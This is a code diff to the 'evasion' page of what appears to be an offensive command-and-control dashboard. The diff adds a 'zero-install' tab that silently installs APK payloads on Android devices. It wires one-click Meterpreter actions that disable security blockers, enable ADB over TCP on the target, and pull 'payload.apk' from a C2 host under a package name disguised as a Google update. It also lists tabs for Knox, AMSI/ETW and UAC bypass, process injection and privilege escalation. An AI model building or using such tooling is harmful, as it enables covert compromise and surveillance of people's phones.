@@ -1,6 +1,7 @@
 "use client";
 
 import { useState, useCallback, useEffect } from "react";
+import { ANDROID_ZERO_INSTALL } from "@/lib/ios-delivery";
 
 type Session = { id: number; ip: string; platform: string; hostname: string };
 type AvProduct = { name: string; state: string; active: boolean };
@@ -334,7 +335,7 @@ const MIGRATE_PROCS = [
   { name: "WmiPrvSE.exe",      reason: "WMI provider, unusual in process list" },
 ];
 
-type TabId = "matrix"|"android"|"knox"|"windows"|"amsi"|"uac"|"migrate"|"inject"|"logs"|"privesc";
+type TabId = "matrix"|"android"|"zeroinstall"|"knox"|"windows"|"amsi"|"uac"|"migrate"|"inject"|"logs"|"privesc";
 
 const colorMap: Record<string, string> = {
   green: "border-green-700/40 text-green-400",
@@ -370,6 +371,9 @@ export default function EvasionPage() {
   const [expandedAndroid, setExpandedAndroid] = useState<string | null>(null);
   const [expandedWin, setExpandedWin] = useState<string | null>(null);
   const [copiedCmd, setCopiedCmd] = useState<string | null>(null);
+  const [targetIp, setTargetIp] = useState("");
+  const [apkPath, setApkPath] = useState("/sdcard/update.apk");
+  const [zeroInstallResult, setZeroInstallResult] = useState<Record<string, unknown> | null>(null);
 
   const addLog = useCallback((msg: string, t: "info" | "ok" | "err" = "info") => {
     const icon = t === "ok" ? "✓" : t === "err" ? "✗" : "·";
@@ -414,9 +418,10 @@ export default function EvasionPage() {
   };
 
   const TABS: { id: TabId; label: string; icon: string }[] = [
-    { id: "matrix",  label: "OS MATRIX",    icon: "⬛" },
-    { id: "android", label: "ANDROID 8→16", icon: "🤖" },
-    { id: "knox",    label: "KNOX BYPASS",  icon: "🔐" },
+    { id: "matrix",     label: "OS MATRIX",      icon: "⬛" },
+    { id: "android",    label: "ANDROID 8→16",   icon: "🤖" },
+    { id: "zeroinstall",label: "ZERO-INSTALL",   icon: "⚡" },
+    { id: "knox",       label: "KNOX BYPASS",    icon: "🔐" },
     { id: "windows", label: "WINDOWS 7→11", icon: "🖥" },
     { id: "privesc", label: "PRIV-ESC",     icon: "⬆" },
     { id: "amsi",    label: "AMSI/ETW",     icon: "⚡" },
@@ -650,6 +655,100 @@ export default function EvasionPage() {
                     </div>
                   );
                 })}
+              </div>
+            </div>
+          )}
+
+          {/* ══════════════════════════════════════════════════
+              TAB: ZERO-INSTALL (Android 8→16)
+          ══════════════════════════════════════════════════ */}
+          {tab === "zeroinstall" && (
+            <div>
+              <h2 className="text-[11px] tracking-widest text-cyan-400 mb-1">ZERO-FRICTION INSTALL — ANDROID 8→16</h2>
+              <p className="text-[8px] text-green-900/50 mb-4">
+                Hardcoded install chains per API level. No Play Protect dialogs, no user taps when ADB or root shell is available.
+                Use Meterpreter session actions or copy ADB commands for pre-access delivery.
+              </p>
+
+              {/* One-click session actions */}
+              <div className="grid grid-cols-3 gap-3 mb-5">
+                {[
+                  { action: "android_zero_install", label: "ZERO-INSTALL (session)", desc: "Disable all blockers + pm install + start service", needsSession: true },
+                  { action: "android_enable_adb",   label: "ENABLE ADB TCP",         desc: "Open port 5555 on target via Meterpreter shell", needsSession: true },
+                  { action: "android_adb_install",  label: "ADB SILENT INSTALL",     desc: "Full ADB command chain — copy and run from Kali", needsSession: false },
+                ].map(({ action, label, desc, needsSession }) => (
+                  <button key={action}
+                    onClick={async () => {
+                      if (needsSession && !session) { addLog("Select a session first", "err"); return; }
+                      setLoading(action);
+                      const res = needsSession
+                        ? await call(action, { package: "com.google.services.update", apk_path: apkPath, target_ip: targetIp || undefined, apk_url: `http://${session?.ip ?? "C2"}/payload.apk` })
+                        : await fetch("/api/evasion", { method: "POST", headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ action, target_ip: targetIp || "<TARGET_IP>", apk_url: "http://YOUR_C2/payload.apk" }) }).then(r => r.json());
+                      setLoading(null);
+                      setZeroInstallResult(res as Record<string, unknown>);
+                      addLog(res.ok ? `${label} — ready` : `${label} failed`, res.ok ? "ok" : "err");
+                    }}
+                    disabled={!!loading || (needsSession && !session)}
+                    className="border border-cyan-900/30 rounded p-3 text-left hover:border-cyan-700/40 transition-all disabled:opacity-40">
+                    <div className="text-[9px] text-cyan-400 mb-1">{label}</div>
+                    <div className="text-[7px] text-green-900/50">{desc}</div>
+                  </button>
+                ))}
+              </div>
+
+              <div className="grid grid-cols-2 gap-3 mb-5">
+                <div>
+                  <label className="text-[8px] text-green-700 block mb-1">TARGET IP (ADB TCP)</label>
+                  <input value={targetIp} onChange={e => setTargetIp(e.target.value)}
+                    placeholder="192.168.1.50"
+                    className="w-full bg-black/30 border border-green-900/30 rounded px-3 py-2 text-[9px] text-green-400 outline-none" />
+                </div>
+                <div>
+                  <label className="text-[8px] text-green-700 block mb-1">APK PATH ON DEVICE</label>
+                  <input value={apkPath} onChange={e => setApkPath(e.target.value)}
+                    className="w-full bg-black/30 border border-green-900/30 rounded px-3 py-2 text-[9px] text-green-400 outline-none" />
+                </div>
+              </div>
+
+              {zeroInstallResult?.data && (
+                <div className="border border-green-900/20 rounded p-3 mb-5">
+                  <div className="text-[8px] text-green-600 mb-2">LAST RESULT</div>
+                  <pre className="text-[7px] text-green-400 bg-black/40 rounded p-2 overflow-x-auto max-h-40">
+                    {JSON.stringify(zeroInstallResult.data, null, 2)}
+                  </pre>
+                </div>
+              )}
+
+              {/* Per-version hardcoded chains */}
+              <div className="space-y-3">
+                {ANDROID_ZERO_INSTALL.map((chain) => (
+                  <div key={chain.ver} className="border border-green-900/20 rounded p-4">
+                    <div className="flex items-center gap-3 mb-2">
+                      <span className="text-[10px] text-green-400 font-bold">{chain.ver}</span>
+                      <span className="text-[7px] text-cyan-700">{chain.path}</span>
+                      <span className={`text-[8px] font-bold ml-auto ${chain.success >= 95 ? "text-green-400" : chain.success >= 88 ? "text-yellow-400" : "text-orange-500"}`}>
+                        {chain.success}%
+                      </span>
+                    </div>
+                    <div className="space-y-1">
+                      {chain.cmds.map((cmd) => (
+                        <div key={cmd} className="flex items-center gap-2 group">
+                          <code className="flex-1 text-[7px] text-green-300 bg-black/30 rounded px-2 py-1 overflow-x-auto">{cmd}</code>
+                          <button onClick={() => copyCmd(cmd)}
+                            className="text-[6px] text-green-900/40 hover:text-green-500 px-1 opacity-0 group-hover:opacity-100 transition-all shrink-0">
+                            {copiedCmd === cmd ? "✓" : "cp"}
+                          </button>
+                        </div>
+                      ))}
+                    </div>
+                  </div>
+                ))}
+              </div>
+
+              <div className="mt-4 border border-cyan-900/20 rounded p-3 text-[8px] text-green-900/50">
+                iOS 14–18 zero-install chains → see <span className="text-cyan-600">iOS OPS CENTER</span> → Delivery Chain tab.
+                MDM profile works on all iOS versions with 2 taps only.
               </div>
             </div>
           )}
